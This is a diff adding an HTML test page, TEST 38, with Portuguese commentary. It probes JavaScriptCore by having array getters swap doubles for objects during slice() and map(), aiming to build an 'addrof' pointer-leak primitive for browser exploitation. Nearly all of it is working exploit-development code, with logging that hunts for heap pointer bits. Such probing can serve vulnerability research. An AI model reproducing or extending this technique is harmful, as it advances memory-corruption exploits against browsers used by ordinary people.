@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>TEST 38 - slice() MIX Stale: Injetar Objeto no Timing Window</title></head>
+<body>
+<h2>TEST 38 — slice() MIX Stale: Janela de Timing → Primitivo addrof</h2>
+
+<p><b>Achado (TEST 33-B):</b> <code>slice()</code> copiou <b>MIX</b> de valores:</p>
+<ul>
+  <li><code>[0]=100, [1]=200</code> → valores <b>pré-getter</b> (butterfly antigo)</li>
+  <li><code>[2]=333</code> → retorno do getter</li>
+  <li><code>[3]=444, [4]=555</code> → valores <b>pós-getter</b> (butterfly novo)</li>
+</ul>
+<p><b>Janela:</b> <code>slice()</code> leu <code>[0..1]</code> antes do getter disparar e
+<code>[3..4]</code> do butterfly já modificado. Se colocarmos um <b>objeto JS</b> em
+<code>[3]</code> depois da modificação, <code>slice()</code> vai copiar a <b>referência do objeto</b>.
+Lendo essa referência como <code>Float64Array</code> expõe os bits do ponteiro → <b>addrof</b>.</p>
+
+<p><b>O que exploramos aqui:</b></p>
+<ul>
+  <li><b>38-A</b> Confirmar que slice() copia o valor pós-mod de [3] e [4]</li>
+  <li><b>38-B</b> Colocar objeto em [3] pós-modificação — slice copia a referência?</li>
+  <li><b>38-C</b> Ler a referência copiada como Float64 → bits do ponteiro (addrof)</li>
+  <li><b>38-D</b> Encadear map() com o mesmo padrão: map sobre stale butterfly com objeto injetado</li>
+</ul>
+
+<pre id="log">Pronto. Execute A → B → C → D.</pre>
+<button onclick="runA()">38-A: CONFIRMAR MIX</button>
+<button onclick="runB()">38-B: INJETAR OBJETO</button>
+<button onclick="runC()">38-C: ADDROF VIA SLICE</button>
+<button onclick="runD()">38-D: MAP() COM OBJETO</button>
+
+<script>
+var log = document.getElementById('log');
+function info(m)  { log.textContent += '\n[INFO] ' + m; }
+function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
+function ok(m)    { log.textContent += '\n[OK]   ' + m; }
+function sep()    { log.textContent += '\n' + '-'.repeat(60); }
+
+function forceGC() {
+  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
+}
+
+// Ler um double como dois Uint32 (decompor bits)
+function f64bits(val) {
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = val;
+  var u32 = new Uint32Array(buf);
+  return { lo: u32[0], hi: u32[1],
+    str: '0x' + u32[1].toString(16).padStart(8,'0') + '_' + u32[0].toString(16).padStart(8,'0') };
+}
+
+// Verificar se um double parece um ponteiro JSC (NaN-boxed ou endereço real)
+// JSC usa NaN-boxing: doubles normais têm bits altos < 0xFFFF
+// Ponteiros têm padrão específico dependendo da plataforma
+function looksLikePointer(bits) {
+  // Em JSC 32-bit: tag de objeto = 0xFFFFFFFF no hi, endereço no lo
+  // Em JSC 64-bit: valor especial no range 0x0001...0xFFFE no hi
+  var hi = bits.hi;
+  var lo = bits.lo;
+  // Checar: não é NaN puro, não é Infinity, não é double normal pequeno
+  if(hi === 0 && lo === 0) return false; // zero
+  if(hi >= 0xFFFF0000) return true;      // possível tag de objeto JSC
+  if(hi > 0 && hi < 0x10000 && lo !== 0) return true; // ponteiro heap típico
+  return false;
+}
+
+// ─── 38-A ────────────────────────────────────────────────────────────────────
+function runA() {
+  log.textContent = '[TEST 38-A] Confirmar MIX de valores pre/pos-mod com sentinelas distintos...\n';
+  sep();
+
+  var PRE_MOD  = [1111.0, 2222.0, 4444.0, 5555.0]; // valores ANTES do getter
+  var POST_MOD = [9111.0, 9222.0, 9444.0, 9555.0]; // valores que o getter coloca
+  var GETTER_RETURN = 3333.0;
+
+  var arr = [PRE_MOD[0], PRE_MOD[1], 0, PRE_MOD[2], PRE_MOD[3]];
+  // arr = [1111, 2222, (getter), 4444, 5555]
+
+  var triggered = false;
+  Object.defineProperty(arr, 2, {
+    get: function() {
+      if(!triggered) {
+        triggered = true;
+        // Modificar todos os outros elementos
+        arr[0] = POST_MOD[0]; // 9111
+        arr[1] = POST_MOD[1]; // 9222
+        arr[3] = POST_MOD[2]; // 9444
+        arr[4] = POST_MOD[3]; // 9555
+        // Expandir o array além do original
+        for(var k = 5; k < 50; k++) arr[k] = k * 0.1;
+        forceGC();
+        info('Getter [2]: modificou arr[0,1,3,4] e expandiu para ' + arr.length);
+      }
+      return GETTER_RETURN;
+    },
+    configurable: true, enumerable: true
+  });
+
+  var sliced = arr.slice();
+  info('arr.length após: ' + arr.length);
+  info('sliced.length: ' + sliced.length);
+  info('sliced: [' + Array.from(sliced).join(', ') + ']');
+
+  // Diagnosticar cada elemento
+  var classification = [];
+  sliced.forEach(function(v, i) {
+    var which;
+    if(v === PRE_MOD[i < 2 ? i : i-1])       which = 'PRE_MOD (' + v + ')';
+    else if(v === POST_MOD[i < 2 ? i : i-1]) which = 'POST_MOD (' + v + ')';
+    else if(v === GETTER_RETURN)              which = 'GETTER_RETURN (' + v + ')';
+    else                                      which = 'DESCONHECIDO (' + v + ')';
+    info('  sliced[' + i + '] = ' + v + ' → ' + which);
+    classification.push(which.startsWith('PRE') ? 'PRE' : which.startsWith('POST') ? 'POST' : which.startsWith('GETTER') ? 'GET' : 'UNK');
+  });
+
+  var mix = classification.some(function(c){return c==='PRE';}) &&
+            classification.some(function(c){return c==='POST';});
+  if(mix) {
+    alerta('MIX CONFIRMADO: ' + classification.join(', ') + ' — slice() leu butterfly antes E depois do getter!');
+    info('Posições PRE: ' + classification.map(function(c,i){return c==='PRE'?i:null;}).filter(function(v){return v!==null;}).join(', '));
+    info('Posições POST: ' + classification.map(function(c,i){return c==='POST'?i:null;}).filter(function(v){return v!==null;}).join(', '));
+  } else {
+    ok('Sem MIX neste run: ' + classification.join(', '));
+  }
+}
+
+// ─── 38-B ────────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 38-B] Colocar OBJETO em posição POST-MOD: slice copia a referência?\n';
+  sep();
+  info('Se slice() lê [3,4] do butterfly NOVO (pós-getter),');
+  info('e colocamos um OBJETO nessas posições no getter,');
+  info('o slice vai copiar a referência do objeto.\n');
+
+  // Objeto alvo — queremos que slice() copie sua referência
+  var targetObject = {
+    id:       0xDEADC0DE,
+    sentinel: 0xCAFEBABE,
+    data:     new Float64Array([1.1, 2.2, 3.3]),
+    tag:      'INJECTED_OBJECT'
+  };
+
+  var arr = [1.1, 2.2, 0, 4.4, 5.5]; // array de doubles
+
+  var triggered = false;
+  Object.defineProperty(arr, 2, {
+    get: function() {
+      if(!triggered) {
+        triggered = true;
+        // Posições [3] e [4]: colocar OBJETO em vez de double
+        arr[3] = targetObject;  // tipo muda: double → object
+        arr[4] = targetObject;  // mesmo objeto
+        // Expandir
+        for(var k = 5; k < 30; k++) arr[k] = k * 1.0;
+        forceGC();
+        info('Getter [2]: arr[3] e arr[4] agora são OBJETO. arr.length=' + arr.length);
+      }
+      return 2.0;
+    },
+    configurable: true, enumerable: true
+  });
+
+  var sliced = arr.slice();
+  info('sliced.length: ' + sliced.length);
+
+  sliced.forEach(function(v, i) {
+    var t = typeof v;
+    info('  sliced[' + i + ']: typeof=' + t + ' value=' + JSON.stringify(v));
+
+    if(t === 'object' && v !== null) {
+      alerta('OBJETO COPIADO pelo slice() em sliced[' + i + ']: id=' + v.id + ' tag=' + v.tag + ' — slice copiou referência do objeto injetado no getter!');
+
+      // Verificar que é exatamente o mesmo objeto (não uma cópia)
+      if(v === targetObject) {
+        alerta('É A MESMA REFERÊNCIA: v === targetObject. Slice copiou o ponteiro, não uma cópia do objeto!');
+      }
+    } else if(t === 'number' && !isNaN(v)) {
+      var bits = f64bits(v);
+      info('  → bits: ' + bits.str + (looksLikePointer(bits) ? ' *** PARECE PONTEIRO! ***' : ''));
+      if(looksLikePointer(bits)) {
+        alerta('DOUBLE QUE PARECE PONTEIRO em sliced[' + i + ']: ' + bits.str + ' — objeto injetado lido como double!');
+      }
+    }
+  });
+}
+
+// ─── 38-C ────────────────────────────────────────────────────────────────────
+function runC() {
+  log.textContent = '[TEST 38-C] addrof via slice(): ler referência de objeto como Float64...\n';
+  sep();
+  info('Técnica addrof clássica em JSC:');
+  info('1. Criar array de doubles (butterfly = ContiguousDouble)');
+  info('2. Via getter, mudar elemento para OBJETO (butterfly → ContiguousJSValue)');
+  info('3. Motor lê referência de objeto mas a interpreta como double (tipo antigo do butterfly)');
+  info('4. O double resultante contém os bits do ponteiro para o objeto → addrof\n');
+
+  // Objeto "vítima" — queremos descobrir seu endereço de heap
+  var victim = {
+    magic: 0x13371337,
+    data:  new Float64Array([9.1, 8.2, 7.3, 6.4]),
+    name:  'victim_object_for_addrof'
+  };
+
+  // Array de doubles puro — butterfly ContiguousDouble
+  var arr = new Array(5);
+  arr[0] = 1.1; arr[1] = 2.2; arr[2] = 0; arr[3] = 4.4; arr[4] = 5.5;
+
+  // Verificar que é array de doubles (se for Contiguous, temos chance)
+  info('arr inicial: [' + Array.from(arr).join(', ') + ']');
+
+  var triggered = false;
+  Object.defineProperty(arr, 2, {
+    get: function() {
+      if(!triggered) {
+        triggered = true;
+        // Mudar arr[3] de double para objeto (força mudança de butterfly)
+        arr[3] = victim;
+        forceGC();
+        info('Getter [2]: arr[3] = victim. Butterfly deve ter mudado de Double para JSValue.');
+      }
+      return 2.0;
+    },
+    configurable: true, enumerable: true
+  });
+
+  var sliced = arr.slice();
+  info('sliced: length=' + sliced.length);
+
+  sliced.forEach(function(v, i) {
+    var t = typeof v;
+    if(t === 'number') {
+      var bits = f64bits(v);
+      info('sliced[' + i + '] = ' + v + ' | bits=' + bits.str);
+      if(looksLikePointer(bits)) {
+        alerta('⚠ ADDROF POTENCIAL: sliced[' + i + '] = ' + bits.str +
+               ' — parece endereço de heap! Se hi=0xFFFF → tag de objeto JSC, lo=endereço.');
+      }
+    } else if(t === 'object' && v !== null) {
+      info('sliced[' + i + '] = OBJETO: id=' + v.magic + ' | mesma ref: ' + (v === victim));
+      if(v === victim) {
+        ok('Slice copiou referência do objeto (motor não fez type confusion aqui — retornou o objeto corretamente).');
+      }
+    }
+  });
+
+  sep();
+  info('Variante: usar map() em vez de slice() (map também usa LENGTH ANTIGO)');
+
+  var arr2 = new Array(5);
+  arr2[0] = 1.1; arr2[1] = 2.2; arr2[2] = 0; arr2[3] = 4.4; arr2[4] = 5.5;
+
+  var triggered2 = false;
+  Object.defineProperty(arr2, 2, {
+    get: function() {
+      if(!triggered2) {
+        triggered2 = true;
+        arr2[3] = victim;
+        forceGC();
+      }
+      return 2.0;
+    },
+    configurable: true, enumerable: true
+  });
+
+  try {
+    var mapped = arr2.map(function(v) { return v; }); // identity map
+    info('\nmapped: length=' + mapped.length);
+    mapped.forEach(function(v, i) {
+      var t = typeof v;
+      if(t === 'number') {
+        var bits = f64bits(v);
+        info('mapped[' + i + '] = ' + v + ' | bits=' + bits.str);
+        if(looksLikePointer(bits)) {
+          alerta('ADDROF via map(): mapped[' + i + '] = ' + bits.str + ' — bits de ponteiro em resultado de map()!');
+        }
+      } else {
+        info('mapped[' + i + '] = ' + t + ': ' + JSON.stringify(v));
+      }
+    });
+  } catch(e) {
+    alerta('EXCECAO em map(): ' + e.message);
+  }
+}
+
+// ─── 38-D ────────────────────────────────────────────────────────────────────
+function runD() {
+  log.textContent = '[TEST 38-D] map() com objeto injetado no getter: callback recebe o objeto?\n';
+  sep();
+  info('map() usa LENGTH ANTIGO (5) mas lê do butterfly pós-modificação.');
+  info('O callback de map() recebe o VALOR do elemento. Se [3] virou objeto,');
+  info('o callback recebe o objeto e pode inspecioná-lo.\n');
+
+  var sentinel_obj = {
+    secret: 0xDEADBEEF,
+    buf: new ArrayBuffer(256),
+    toString: function() { return '[SENTINEL OBJECT]'; }
+  };
+  var sentinel_view = new Uint32Array(sentinel_obj.buf);
+  for(var i = 0; i < sentinel_view.length; i++) sentinel_view[i] = 0xABCD1234;
+
+  var arr = [10.0, 20.0, 0, 40.0, 50.0];
+  var mapCallbacks = [];
+
+  var triggered = false;
+  Object.defineProperty(arr, 2, {
+    get: function() {
+      if(!triggered) {
+        triggered = true;
+        arr[3] = sentinel_obj; // double → objeto em [3]
+        arr[4] = sentinel_obj; // também em [4]
+        forceGC();
+        info('Getter [2]: arr[3] e arr[4] = sentinel_obj');
+      }
+      return 2.0;
+    },
+    configurable: true, enumerable: true
+  });
+
+  info('Chamando arr.map()...');
+  try {
+    var result = arr.map(function(v, i, orig) {
+      var entry = { idx: i, type: typeof v, val: v };
+      mapCallbacks.push(entry);
+      return v;
+    });
+
+    info('\nCallbacks de map() registrados: ' + mapCallbacks.length);
+    mapCallbacks.forEach(function(c) {
+      info('  callback[' + c.idx + ']: type=' + c.type + ' val=' + JSON.stringify(c.val));
+      if(c.type === 'object' && c.val !== null) {
+        alerta('OBJETO RECEBIDO NO CALLBACK de map() em idx=' + c.idx +
+               ': secret=' + (c.val.secret ? c.val.secret.toString(16) : '?') +
+               ' — map passou o objeto injetado diretamente para o callback!');
+
+        // Verificar o buffer interno do objeto para confirmar
+        if(c.val.buf instanceof ArrayBuffer) {
+          var view = new Uint32Array(c.val.buf);
+          info('  buf[0]=' + view[0].toString(16) + ' (esperado 0xABCD1234)');
+          if(view[0] === 0xABCD1234) {
+            alerta('BUFFER SENTINEL VERIFICADO: o objeto recebido no callback é exatamente o sentinel_obj. Injeção de objeto via getter em array de doubles CONFIRMADA!');
+          }
+        }
+
+        // Tentar ler o "endereço" desse objeto via JSON.stringify + heurística
+        info('  sentinel_obj === c.val: ' + (sentinel_obj === c.val));
+      } else if(c.type === 'number') {
+        var bits = f64bits(c.val);
+        if(looksLikePointer(bits)) {
+          alerta('PONTEIRO NO CALLBACK map() idx=' + c.idx + ': ' + bits.str + ' — objeto lido como double pelo motor!');
+        }
+      }
+    });
+
+    info('\nresult.length: ' + result.length);
+    result.forEach(function(v, i) {
+      if(typeof v === 'object') {
+        alerta('result[' + i + '] DO MAP É OBJETO: secret=' + (v.secret || '?') + ' — resultado de map() contém objeto injetado!');
+      }
+    });
+
+  } catch(e) {
+    alerta('EXCECAO em map(): ' + e.message + ' — map() não aceitou objeto no butterfly de doubles!');
+  }
+}
+</script>
+</body>
+</html>
